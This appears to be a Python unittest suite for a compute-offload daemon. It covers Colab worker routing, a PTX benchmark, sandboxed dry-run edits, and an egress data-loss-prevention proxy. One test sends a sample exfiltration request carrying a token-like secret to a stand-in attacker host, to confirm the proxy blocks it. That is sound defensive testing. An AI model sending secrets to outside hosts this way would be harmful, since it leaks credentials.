"""Comprehensive verification suite for CHIMERA-TP v18.0 PERFECTION (4-Tier Colab+PTX VGPU, DLP+UCB1, Folded-Cavity RLNC, Ghost Bubble & Lazy RAM)."""

from __future__ import annotations

import http.server
import json
import sys
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from pathlib import Path

from chimera_tp.autopilot import OpsConfig
from chimera_tp.dashboard import ChimeraDaemon
from chimera_tp.platform import (
    ColabCliBridge,
    CristaeFoldedCavityRLNC,
    NvCudaPtxEngine,
    parse_marked_json,
    parse_usage_text,
    select_lightest_profile,
)


class TestV18Perfection(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.ops_dir = Path(self._tmp.name) / "ops"
        cfg = OpsConfig(
            node_name="v18-test",
            role="controller",
            dashboard_bind="127.0.0.1:0",
            beam_port=0,
            rpc_v4_port=0,
            rpc_v6_port=-1,
            query_port=0,
            warp_port=-1,
            edge_proxy_port=-1,
            allowed_query_roots=[self._tmp.name],
            search_roots=[self._tmp.name],
            edge_targets={},
            phantom_enabled=False,
        )
        self.daemon = ChimeraDaemon(config=cfg, ops_dir=self.ops_dir, auto_seed_on_empty=False).start()
        self.anchor = self.daemon.platform.anchor_url
        self.proxy = self.daemon.platform.egress.url

    def tearDown(self) -> None:
        self.daemon.close()
        self._tmp.cleanup()

    def _get(self, path: str) -> dict:
        with urllib.request.urlopen(f"{self.anchor}{path}", timeout=5.0) as r:
            return json.loads(r.read().decode("utf-8"))

    def _post(self, path: str, body: dict) -> tuple[int, dict]:
        req = urllib.request.Request(
            f"{self.anchor}{path}",
            data=json.dumps(body).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=8.0) as r:
                return r.status, json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read().decode("utf-8"))

    def test_01_4tier_colab_pro_offload_and_nvcuda_ptx_jit(self) -> None:
        # Mock a live Colab Pro T4 CUDA worker
        class ColabH(http.server.BaseHTTPRequestHandler):
            def do_POST(self) -> None:
                clen = int(self.headers.get("Content-Length", "0") or 0)
                body = json.loads(self.rfile.read(clen).decode() or "{}")
                texts = body.get("input", [])
                if isinstance(texts, str):
                    texts = [texts]
                dim = int(body.get("dimensions") or 128)
                resp = json.dumps({
                    "object": "list",
                    "model": "chimera-colab-cuda",
                    "data": [{"object": "embedding", "index": i, "embedding": [0.1] * dim} for i in range(len(texts))],
                    "chimera_engine": "colab_pro_cuda",
                }).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(resp)))
                self.end_headers()
                self.wfile.write(resp)

            def log_message(self, *_a: object) -> None:
                pass

        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), ColabH)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            st_r, reg = self._post(
                "/v1/vgpu/workers/register",
                {"worker_id": "colab-pro-t4", "url": f"http://127.0.0.1:{port}", "gpu_name": "NVIDIA Tesla T4", "vram_mb": 15360},
            )
            self.assertEqual(st_r, 200)
            self.assertEqual(reg["worker"]["worker_id"], "colab-pro-t4")

            # Pareto router MUST prefer Colab Pro CUDA to keep Windows workstation at 0% GPU impact
            st_p, route = self._post("/v1/vgpu/route", {"max_ms": 500, "max_cost_usd": 0.0, "min_tier": "high"})
            self.assertEqual(st_p, 200)
            self.assertEqual(route["selected"]["engine"], "colab_pro_cuda")
            self.assertEqual(route["selected"]["workstation_impact"], "0%")

            # OpenAI-compat embeddings offloaded directly to Colab Pro worker
            st_e, emb = self._post("/v1/openai/v1/embeddings", {"input": ["heavy cuda job 1", "heavy cuda job 2"], "dimensions": 128})
            self.assertEqual(st_e, 200)
            self.assertIn("colab_pro", emb["chimera_engine"])
            self.assertEqual(len(emb["data"]), 2)
        finally:
            srv.shutdown(); srv.server_close()

        # Test real nvcuda.dll PTX JIT kernel on Windows GTX 1650 (or clean CPU yield fallback on Linux)
        st_k, kres = self._post("/v1/vgpu/ptx-bench", {"n": 4096, "force": True})
        self.assertEqual(st_k, 200)
        self.assertTrue(kres["ok"])
        if NvCudaPtxEngine().probe()["available"]:
            self.assertEqual(kres["engine"], "win_nvcuda_ptx")
            self.assertEqual(kres["vram_retained_mb"], 0.0)

    def test_02_zero_leak_egress_dlp_and_ucb1_domain_bandit(self) -> None:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": self.proxy}))
        # Outbound secret leak to non-whitelisted external host MUST be blocked with 403 X-Chimera-DLP: BLOCKED!
        leak_url = "http://evil-exfil.example.invalid/collect?tok=ghp_1234567890abcdefghijklmnop"
        req = urllib.request.Request(leak_url, headers={"X-Chimera-App": "compromised-pkg"})
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            opener.open(req, timeout=4.0)
        self.assertEqual(ctx.exception.code, 403)
        self.assertEqual(ctx.exception.headers.get("X-Chimera-DLP"), "BLOCKED")
        st = self._get("/v1/egress/stats")["egress"]
        self.assertGreaterEqual(st["dlp_blocked"], 1)

        doms = self._get("/v1/egress/domains")
        self.assertTrue(doms["ok"])

    def test_03_cristae_folded_cavity_sc_rlnc_32pct_burst_loss(self) -> None:
        st, res = self._post("/v1/rlnc/folded-bench", {"payload_bytes": 16384, "loss_rate": 0.32})
        self.assertEqual(st, 200)
        self.assertTrue(res["ok"])
        self.assertTrue(res["sha256_exact"])
        self.assertTrue(res["within_64kb_l2"])
        self.assertGreaterEqual(res["loss_rate_pct"], 30.0)

    def test_04_ghost_bubble_zero_risk_dry_run_discard_and_commit(self) -> None:
        ws = Path(self._tmp.name) / "target_proj"
        ws.mkdir()
        (ws / "config.txt").write_text("v1=safe\n", encoding="utf-8")

        # 1. Dry-run destructive edit inside bubble -> discard -> host file 100% untouched!
        st1, b1 = self._post(
            "/v1/ghost/run",
            {
                "target_dir": str(ws),
                "cmd": [sys.executable, "-c", "open('config.txt','w').write('BROKEN'); open('new.txt','w').write('hi')"],
            },
        )
        self.assertEqual(st1, 200)
        self.assertEqual(b1["exit_code"], 0)
        self.assertEqual(b1["diff"]["modified"], ["config.txt"])
        self.assertEqual(b1["diff"]["added"], ["new.txt"])
        self._post("/v1/ghost/discard", {"bubble_id": b1["bubble_id"]})
        self.assertEqual((ws / "config.txt").read_text(encoding="utf-8"), "v1=safe\n")
        self.assertFalse((ws / "new.txt").exists())

        # 2. Dry-run good edit inside bubble -> commit -> host updated atomically!
        st2, b2 = self._post(
            "/v1/ghost/run",
            {
                "target_dir": str(ws),
                "cmd": [sys.executable, "-c", "open('config.txt','w').write('v2=upgraded\\n')"],
            },
        )
        self.assertEqual(st2, 200)
        st_c, cres = self._post("/v1/ghost/commit", {"bubble_id": b2["bubble_id"]})
        self.assertEqual(st_c, 200)
        self.assertTrue(cres["committed"])
        self.assertEqual((ws / "config.txt").read_text(encoding="utf-8"), "v2=upgraded\n")

    def test_05_colab_cli_bridge_anti_congestion_and_headless_exec(self) -> None:
        import os
        import stat

        # 1. Anti-congestion right-sizing rules
        self.assertEqual(select_lightest_profile("cuda_embed", batch_size=2, require_gpu=False)["profile"], "CPU")
        self.assertEqual(select_lightest_profile("cuda_embed", batch_size=32, require_gpu=False)["profile"], "T4")
        self.assertEqual(select_lightest_profile("cuda_matmul", require_gpu=True)["profile"], "T4")
        self.assertEqual(select_lightest_profile("highram_verify")["profile"], "CPU_HIGH_MEM")
        self.assertEqual(select_lightest_profile("llm_large")["profile"], "L4")
        self.assertEqual(select_lightest_profile("cuda_matmul", allow_heavy_gpu=True)["profile"], "A100")

        # 2. Single-shape GPUs (L4/H100) MUST omit --high-mem; A100 & CPU_HIGH_MEM MUST include it
        self.assertNotIn("--high-mem", ColabCliBridge.build_new_command("s1", "L4"))
        self.assertNotIn("--high-mem", ColabCliBridge.build_new_command("s1", "H100"))
        self.assertIn("--high-mem", ColabCliBridge.build_new_command("s1", "A100"))
        self.assertIn("--high-mem", ColabCliBridge.build_new_command("s1", "CPU_HIGH_MEM"))

        # 3. Usage & marked JSON parsers
        u = parse_usage_text("\x1b[32mCurrent balance: 2350.14 compute units\x1b[0m\nUsage rate: 0.00/hr\nActive assignments: 0")
        self.assertEqual(u["balance_cu"], 2350.14)
        self.assertEqual(u["active_assignments"], 0)
        parsed = parse_marked_json("noise\n===CHIMERA_COLAB_OUT_START===\n{\"ok\":true,\"val\":42}\n===CHIMERA_COLAB_OUT_END===\ntail")
        self.assertEqual(parsed["val"], 42)

        # 4. End-to-end mock `colab` CLI binary verifying: status -> Pareto route -> new -> exec -f -> CU-guard auto-stop -> 0 leaked sessions!
        log_file = Path(self._tmp.name) / "colab_calls.log"
        stub_py = Path(self._tmp.name) / "fake_colab.py"
        stub_py.write_text(
            "import json, subprocess, sys\n"
            "from pathlib import Path\n"
            f"LOG = Path({str(log_file)!r})\n"
            "args = sys.argv[1:]\n"
            "if len(args) >= 2 and args[0] == '--config': args = args[2:]\n"
            "sub = args[0] if args else ''\n"
            "with LOG.open('a', encoding='utf-8') as f: f.write(json.dumps(args) + '\\n')\n"
            "if sub == 'usage':\n"
            "    print('Current balance: 2350.14 compute units\\nUsage rate: 0.00/hr\\nActive assignments: 0')\n"
            "elif sub == 'sessions':\n"
            "    print('[colab] No active sessions found on server.')\n"
            "elif sub == 'new':\n"
            "    print('Created session')\n"
            "elif sub == 'exec':\n"
            "    fi = args.index('-f') + 1\n"
            "    rc = subprocess.run([sys.executable, args[fi]], check=False).returncode\n"
            "    sys.exit(rc)\n"
            "elif sub == 'stop':\n"
            "    print('Stopped session')\n",
            encoding="utf-8",
        )
        if os.name == "nt":
            stub_bin = Path(self._tmp.name) / "fake_colab.cmd"
            stub_bin.write_text(f'@echo off\r\n"{sys.executable}" "{stub_py}" %*\r\n', encoding="utf-8")
        else:
            stub_bin = Path(self._tmp.name) / "fake_colab.sh"
            stub_bin.write_text(f'#!/bin/sh\nexec "{sys.executable}" "{stub_py}" "$@"\n', encoding="utf-8")
            stub_bin.chmod(stub_bin.stat().st_mode | stat.S_IEXEC)

        self.daemon.platform.colab._colab_bin_override = str(stub_bin)
        self.daemon.platform.colab._status_cache = None

        st_info = self._get("/v1/vgpu/colab/status?refresh=1")
        self.assertTrue(st_info["local_cli_found"])
        self.assertEqual(st_info["usage"]["balance_cu"], 2350.14)
        self.assertEqual(st_info["sessions"]["sessions"], [])

        # Pareto route MUST now automatically pick colab_cli_headless (0% Windows GPU load!) without any manual ngrok worker!
        st_pr, route = self._post("/v1/vgpu/route", {"max_ms": 500, "max_cost_usd": 0.0, "min_tier": "cuda_heavy"})
        self.assertEqual(st_pr, 200)
        self.assertEqual(route["selected"]["engine"], "colab_cli_headless")
        self.assertEqual(route["selected"]["workstation_impact"], "0%")

        # Headless exec (cuda_embed) runs script via `colab exec -f` and auto-stops session in finally (CU-leak guard!)
        st_ex, ex = self._post(
            "/v1/vgpu/colab/exec",
            {"task_kind": "cuda_embed", "payload": {"texts": ["hello colab fabric"], "dim": 64}, "profile": "CPU"},
        )
        self.assertEqual(st_ex, 200)
        self.assertTrue(ex["ok"])
        self.assertTrue(ex["auto_stopped_cu_guard"])
        self.assertEqual(ex["workstation_gpu_impact"], "0%")
        self.assertEqual(ex["result"]["count"], 1)
        self.assertEqual(len(ex["result"]["embeddings"][0]), 64)

        # Verify `stop` was actually invoked by CU-leak guard
        calls = [json.loads(ln) for ln in log_file.read_text(encoding="utf-8").splitlines() if ln.strip()]
        subcmds = [c[0] for c in calls]
        self.assertIn("new", subcmds)
        self.assertIn("exec", subcmds)
        self.assertIn("stop", subcmds)

        # Verify WebSocket-SSH tunnel command generation (zero ngrok!)
        st_tn, tn = self._post("/v1/vgpu/colab/tunnel-cmd", {"session": "chimera_t4", "local_port": 9795, "remote_port": 9795})
        self.assertEqual(st_tn, 200)
        self.assertIn("ssh", tn["cmd"][0])
        self.assertTrue(any("ssh --proxy-mode -s chimera_t4" in arg for arg in tn["cmd"]))

    def test_06_autonomous_single_entity_scale_warm_reuse_and_idle_reaper(self) -> None:
        import os
        import stat
        import time

        log_file = Path(self._tmp.name) / "auto_colab_calls.log"
        stub_py = Path(self._tmp.name) / "fake_auto_colab.py"
        stub_py.write_text(
            "import json, subprocess, sys\n"
            "from pathlib import Path\n"
            f"LOG = Path({str(log_file)!r})\n"
            "args = sys.argv[1:]\n"
            "if len(args) >= 2 and args[0] == '--config': args = args[2:]\n"
            "sub = args[0] if args else ''\n"
            "with LOG.open('a', encoding='utf-8') as f: f.write(json.dumps(args) + '\\n')\n"
            "if sub == 'usage':\n"
            "    print('Current balance: 2350.14 compute units\\nUsage rate: 0.00/hr\\nActive assignments: 0')\n"
            "elif sub == 'sessions':\n"
            "    print('[colab] No active sessions found on server.')\n"
            "elif sub == 'new':\n"
            "    print('Created session')\n"
            "elif sub == 'exec':\n"
            "    fi = args.index('-f') + 1\n"
            "    sys.exit(subprocess.run([sys.executable, args[fi]], check=False).returncode)\n"
            "elif sub == 'stop':\n"
            "    print('Stopped session')\n",
            encoding="utf-8",
        )
        if os.name == "nt":
            stub_bin = Path(self._tmp.name) / "fake_auto_colab.cmd"
            stub_bin.write_text(f'@echo off\r\n"{sys.executable}" "{stub_py}" %*\r\n', encoding="utf-8")
        else:
            stub_bin = Path(self._tmp.name) / "fake_auto_colab.sh"
            stub_bin.write_text(f'#!/bin/sh\nexec "{sys.executable}" "{stub_py}" "$@"\n', encoding="utf-8")
            stub_bin.chmod(stub_bin.stat().st_mode | stat.S_IEXEC)

        # Configure fast reaper interval & short idle_ttl_s to verify real background auto-reap
        self.daemon.platform.colab._colab_bin_override = str(stub_bin)
        self.daemon.platform.colab._reaper_interval_s = 0.12
        self.daemon.platform.colab._status_cache = None
        self.daemon.platform.colab.start_autonomous(ephemeral=True)
        self._get("/v1/vgpu/colab/status?refresh=1")

        st_p, pol = self._post(
            "/v1/vgpu/colab/policy",
            {"enabled": True, "idle_ttl_s": 0.45, "auto_min_batch": 4, "warm_session_reuse": True},
        )
        self.assertEqual(st_p, 200)
        self.assertEqual(pol["policy"]["auto_min_batch"], 4)

        # Verify HostYieldGovernor is wired properly (never UNKNOWN!)
        vst = self._get("/v1/vgpu/status")
        self.assertIn(vst["governor_mode"], ("USER_ACTIVE", "TURBO_IDLE", "SOVEREIGN_LOCAL"))

        # 1. Light batch (2 < auto_min_batch=4) -> stays ultra-fast local, 0 Colab invocations!
        st_l, res_l = self._post("/v1/openai/v1/embeddings", {"input": ["tiny 1", "tiny 2"], "dimensions": 64})
        self.assertEqual(st_l, 200)
        self.assertNotIn("colab", res_l["chimera_engine"])

        # 2. Heavy batch (4 >= auto_min_batch=4) on the SAME OpenAI endpoint -> AUTO scale-from-zero onto Colab!
        st_h1, res_h1 = self._post(
            "/v1/openai/v1/embeddings",
            {"input": ["heavy a", "heavy b", "heavy c", "heavy d"], "dimensions": 64},
        )
        self.assertEqual(st_h1, 200)
        self.assertTrue(res_h1["chimera_engine"].startswith("colab_auto_elastic:"))
        self.assertFalse(res_h1["warm_pool_hit"])
        self.assertEqual(res_h1["workstation_gpu_impact"], "0%")

        # 3. Second heavy batch immediately after -> AUTO reuses warm Colab session (0 extra `colab new` calls!)
        st_h2, res_h2 = self._post(
            "/v1/vgpu/compute",
            {"task_kind": "embed", "payload": {"texts": ["batch2 a", "batch2 b", "batch2 c", "batch2 d"], "dim": 64}},
        )
        self.assertEqual(st_h2, 200)
        self.assertTrue(res_h2["chimera_engine"].startswith("colab_auto_elastic:"))
        self.assertTrue(res_h2["warm_pool_hit"])

        calls_before_reap = [json.loads(ln)[0] for ln in log_file.read_text(encoding="utf-8").splitlines() if ln.strip()]
        self.assertEqual(calls_before_reap.count("new"), 1)
        self.assertEqual(calls_before_reap.count("exec"), 2)
        self.assertEqual(calls_before_reap.count("stop"), 0)

        # 4. Wait past idle_ttl_s (0.45s) -> background Idle-Reaper MUST automatically call `colab stop`!
        deadline = time.monotonic() + 4.0
        while time.monotonic() < deadline:
            auto_st = self._get("/v1/vgpu/colab/policy")["autonomous"]
            if auto_st["auto_reaped"] >= 1 and auto_st["mode_label"] == "AUTO:SLEEP":
                break
            time.sleep(0.1)

        final_auto = self._get("/v1/vgpu/colab/policy")["autonomous"]
        self.assertGreaterEqual(final_auto["auto_reaped"], 1)
        self.assertEqual(final_auto["mode_label"], "AUTO:SLEEP")
        self.assertEqual(final_auto["managed_sessions"], [])
        calls_after_reap = [json.loads(ln)[0] for ln in log_file.read_text(encoding="utf-8").splitlines() if ln.strip()]
        self.assertGreaterEqual(calls_after_reap.count("stop"), 1)


if __name__ == "__main__":
    unittest.main()
